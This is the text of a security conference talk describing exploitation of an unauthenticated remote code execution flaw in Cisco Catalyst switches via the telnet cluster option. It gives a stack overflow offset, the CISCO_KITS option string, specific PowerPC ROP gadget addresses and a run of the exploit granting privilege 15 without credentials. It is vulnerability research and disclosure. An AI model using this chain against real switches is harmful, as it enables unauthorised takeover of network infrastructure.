Cisco Catalyst 
Exploitation
Artem Kondratenko
@artkond
Whoami
-Penetration tester @ Kaspersky Lab
-Hacker
-OSC(P|E)
-Skydiver ;)
Long story short
• On March 26th 2017 Cisco announces that numerous 
models of switches are vulnerable to unauthenticated 
remote code execution vulnerability
• No signs of exploitation in the wild
• No exploit available
Cisco advisory
Cisco advisory
Vendor advice:
Disable telnet
Disable telnet folks
• Telnet is an old legacy protocol
Disable telnet folks
• Telnet is an old legacy protocol
• SSH has been around for decades – a secure replacement 
for telnet
Disable telnet folks
• Telnet is an old legacy protocol
• SSH has been around for decades – a secure replacement 
for telnet
• Even more: according to the advisory, using telnet on a 
catalyst switch might be simple way for the attacker fully 
compromise the switch
Still not convinced 
• No public exploit
• No knowledge of in-the-wild exploitation
• Critical-shmitical, should we even care?
Public sources for 
researching the vulnerability
• Cisco advisory
• Vault 7 leak
Vault 7: Hacking Tools Revealed
Hacking techniques and potential exploit descriptions for 
multiple vendors.
This was the source Cisco Systems used for their research 
on the advisory released on March 26th
Cisco switch exploit
Codename: ROCEM
Cisco switch exploit
Codename: ROCEM
Cisco switch exploit
Codename: ROCEM
Rocem: Modes of Interaction
• Set
• Run exploit to set credless authentication
• Unset
• Run exploit to set credentials back in place
• Interactive Mode
• Exploit the system and present the attacker with shell 
immediately 
Easy enough. The perfect plan
• Take two switches
• Cluster dem switches!
• Look for a magic whatever there is in the traffic
• ???
• Profit!!!
Clustering Cisco switches
Controlling Slave-switches from Master
$ telnet 192.168.88.10
catalyst1#rcommand 1
catalyst2#show priv
Current privilege level is 15
Clustering Catalyst switches
Telnet?
Clustering Cisco switches: L2 telnet
Magic telnet option
Telnet Debug log from Vault 
ROCEM testing notes
Telnet commands and options
All Hope Is Lost
Replaying CISCO_KITS option during generic telnet session 
doesn’t work L
And also...
Cisco IPS rule for this vuln is called “Cisco IOS CMP Buffer 
Overflow”
Peeking at firmware
The firmware is available at the flash partition of the 
switch:
catalyst2#dir flash:
Directory of flash:/
2  -rwx
9771282   Mar 1 1993 00:13:28 +00:00  c2960-lanbasek9-mz.122-
55.SE1.bin
3  -rwx
2487   Mar 1 1993 00:01:53 +00:00  config.text
4  -rwx
3096   Mar 1 1993 00:09:27 +00:00  multiple-fs
Peeking at firmware
$ binwalk -e c2960-lanbasek9-mz.122-55.SE1.bin 
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1120x70            bzip2 compressed data, block size = 900k
Unpacked binary size is around 30 mb
The Reality L
Jokes aside
• CPU Architecture: PowerPC 32 bit big-endian
• Entry point at 0x3000 (obvious during device boot process 
if you look at it via serial)
Discovering functions with IDA 
python
• Nice script by Federico Muttis (aka @acid_)
• https://exploiting.wordpress.com/2011/12/06/quickpost-
idapython-script-to-identify-unrecognized-functions/
Discovering functions with IDA 
python
Result: 
~80k 
functions
discovered
ahhh.. the pain of static analysis
• No symbols.. Well, of course
• The whole OS is a single binary
• Indirect function call via function call tables filled at run 
time
Setting up debug environment
• There’s no public SDK
• Some firmware has a “gdb kernel” command. 
• Custom gdb server protocol
• Unsupported by modern versions of gdb
Two options:
• Dig up an old gdb version and try to patch it
• Use IODIDE (by nccgroup)
George Nosenko built an IDA adapter to debug IOS but it’s 
not public
So I patched GDB…
IODIDE –
the smooth 
experience
Well.. Had to debug 
IODIDE to be able to 
debug IOS
Hunting for string XREFS
After recognizing functions and strings with IDAPython
XREFS start to appear:
Digging deeper
Cluster all telnets!
• Telnet code is rather symmetrical
• The code for parsing a custom clustering command for 
client and server side is found in the same function
Cluster all telnets!
Client side sends a string:
«\x03CISCO_KITS\x012::1:»
Second string modifier %s –
was observed empty in the 
traffic dump
Let’s take a closer look at 
the code that parses this 
string
Cluster all telnets!
• The server portion of the code parses the “CISCO_KITS” 
options further down the code
• And it does it in an interesting manner J
Cluster telnet
Copying until “:” to the buffer residing on the 
stack..J
Buffalo overflow!
Smashing the stack
• PowerPC stack frame
• Local arguments are placed above the return address
• If the buffer boundaries are not checked we get ourselves 
a typical overflow scenario
Smashing the stack
Overwriting the return address means the execution flow is 
now controlled with user input
Locating the PC overwrite 
offset
• Cyclic patterns are often used to determine the exact 
location in the user-supplied buffer that overflows the 
return address
• https://github.com/Gallopsled/pwntools - very nice lib with 
the ability to generate cyclic patterns
PC = 0x64384164
or
‘d8Ad’ in ASCII
from pwn import *
payload = cyclic_metasploit(200)
sock.send(payload)
cyclic_metasploit_find(‘d8Ad’)
Result:
115
Crash – instruction pointer is overwritten by a DWORD at 
offset 115 (116th byte)
Too easy?
• By the book overflow
• R9 points to our buffer
• No bad chars
• Wow, that looks to good to be true
• Just overwrite Program Counter with a gadget that jumps 
to R9
The “jump to r9” gadget
1. Load the contents of register R9 to CTR register
2. Never mind the garbage instruction J
3. ”Branch CTR” instruction transfers the control flow to the 
address contained in register CTR
Doing it like a pro
• Just need to place the address of the ”jmp r9” gadget to 
the place where PC is overwritten
• What could possibly go wrong?
Fail
• Both heap and stack are non-executable. Btw, stack 
resides on the heap ;)
• Device reboots
• But why?
Is this data execution 
prevention?
• I don’t know
• But there’s been research on Cisco devices before
• Let’s recall the brilliant presentation @BlackHat by 
Felix "FX" Lindner
• It is suggested that this might happen because of 
instruction and data caching in PowerPC
RETURN
ORIENTED
PROGRAMMING
Return oriented programing:
Why?
• A technique to bypass DEP (data execution prevention)
• In our case we avoid instruction caching
Return oriented programing:
How does it work?
• Use existing code in the binary to achieve your goals
• Use stack as the data source for instructions that are used
• Chain snippets of code (gadgets) via jmp/call/ret 
instructions
Return oriented programing:
How does it work?
A candidate gadget must meet two conditions:
1. Execute payload (i.e. reading or writing to some 
memory)
2. Contain instructions to be able to transfer execution flow 
to the next gadget
Return oriented programing:
Limitations
• There is only a limited set of gadgets available
• Most gadgets modify stack frame. This has to taken into 
account. Returning execution flow to its original path 
might be tricky because of this.
What kind of action can be 
performed via ROP?
•Arbitrary memory writes
...which might lead to..
•Arbitrary code execution
Arbitrary memory writes via 
ROP
The idea is simple:
• Find a gadget that loads values from the stack into registers
• One value will be used as an address to write to
• Another on will be used as a value to be written at that address
• Find a second gadget that performs a write operation with those 
two registers
• I.E. write value contained in register r30 to address contained in 
register r31
One necessary requirement:
The gadget should be able to jump to the next gadget or, if 
it is the last one, properly return the execution flow. 
In both cases we’re looking for gadgets that do an 
additional operation consisting of the following primitives:   
• Take next gadget’s address from the stack
• Load it into the Link Register
• Jump to the value in the Link Register
Gadget chaining to perform arbitrary 
memory writes
Typical function epilog in the firmware
Write primitive #1
Write primitive #1
Write primitive #1
1. Move stack by 0x10
2. Jump to next gadget
Write primitive #1
Write primitive #2
The result
We just wrote arbitrary data to arbitrary 
address
Looking for gadgets
• https://github.com/sashs/Ropper
Ok, whatever dude... But 
whatcha gonna write?
The plan is:
• Find a good place in firmware to patch. It might 
be:
• Control flow
• Inner data structures related to authentication
• Function pointers
The perfect plan
First thing that comes to mind – patch the execution flow, 
responsible for the credential check.
Wow... Looks like it worked:
$ telnet 192.168.88.10
Trying 192.168.88.10...
Connected to 192.168.88.10.
Escape character is '^]'.
catalyst1>
Not quite L
Works only under the debugger. Exception is triggered 
when trying to exploit the live set-up
More static analysis
• A couple of hours (days?) later...
More static analysis
• A couple of hours (days?) later...
More static analysis
• A couple of hours (days?) later...
Long story short
• Both is_cluster_mode and get_privilege_level are 
reference indirectly
• This means a memory pointer is dereferenced containing 
the actual function address
• We can apply our write-primitives to change this pointer 
to something we like
But why are this funcs
important?
If is_cluster_mode mode returns a non-zero value then the 
decision to present a user with shell is only based on 
privilege level
Indirect function calls
Got privileges? No creds required
Got privileges? No creds required
Finish him!
• We will overwrite the pointer to is_cluster_mode with a 
function that always returns 1
• We will overwrite the pointer to get_privilege_level with a 
funciton that always returns 15
The only thing left is to find suitable gadgets for this
1st gadget
0x000037b4: 
lwz r0, 0x14(r1)
mtlr r0
lwz r30, 8(r1)
lwz r31, 0xc(r1)
addi r1, r1, 0x10 
blr
1. Put ret address into r0
2. Load data pointed by r1+8 into r30 (is_cluster_mode
func pointer)
3. Load data pointed by r1+0xc into r31 (address of “ret 
1” function)
4. Add 0x10 to stack pointer
5. BLR! We jump to the next gadget
2nd gadget
0x00dffbe8: 
stw r31, 0x34(r30)
lwz r0, 0x14(r1)
mtlr r0
lmw r30, 8(r1)
addi r1, r1, 0x10
blr
1. Write r31 contents to memory pointer by 
r30+0x34
2. Move next gadget’s address into r0
3. Junk code
4. Shift stack by 0x10 bytes
5. BLR! Jump to the next gadget
3rd, 4th and 5th gadgets
0x0006788c: 
lwz r9, 8(r1)
lwz r3, 0x2c(r9)
lwz r0, 0x14(r1)
mtlr r0
addi r1, r1, 0x10
blr
1. r3 = *(0x2c + *(r1+8))  - address of 
pointer to get_privilege_level func
2. R31 = *(r1 + 8) – r31  conteints address 
of function that always return 15
3. Overwrite the pointer
0x006ba128: 
lwz r31, 8(r1)
lwz r30, 0xc(r1)
addi r1, r1, 0x10
lwz r0, 4(r1)
mtlr r0
blr
0x0148e560: 
stw r31, 0(r3)
lwz r0, 0x14(r1)
mtlr r0
lwz r31, 0xc(r1)
addi r1, r1, 0x10
blr
PROFIT!
$ python c2960-lanbasek9-m-12.2.55.se11 192.168.88.10 --set
[+] Connection OK
[+] Recieved bytes from telnet service: '\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f'
[+] Sending cluster option
[+] Setting credless privilege 15 authentication
[+] All done
$ telnet 192.168.88.10
Trying 192.168.88.10...
Connected to 192.168.88.10.
Escape character is '^]'.
catalyst1#show priv
Current privilege level is 15
Demo time!
Side notes
• These switch models are common on pentests
• Successfully exploited this vulnerability on real life 
engagements:
• Leak firmware version via SNMP or CDP
• Customize exploit for the exact version
• Enjoy your shell
Further research
• Shellcode reliability for multiple firmware versions
• Automating the search for suitable ROP gadgets
• Finding a way execute arbitrary PPC instructions instead 
of arbitrary memory writes 
Stuff to think about
• We know that switches find neighbors suitable for 
clustering using CDP protocol
• We know that there might be no authentication in place 
• We know that the master switch is able to fully control the 
slave via a privilege 15 shell
What if...
• We are in the same broadcast segment as the target 
switch
• We craft the necessary CDP packets so the target switch 
considers us a candidate for clustering
• We make an L2 telnet connection asking for a shell 
simulating the cluster “rcommand”
Will this work?
• Remains to be seen
• Ongoing research
Thanks!
Check PoC source at:
https://github.com/artkond/cisco-rce
@artkond
artkond.com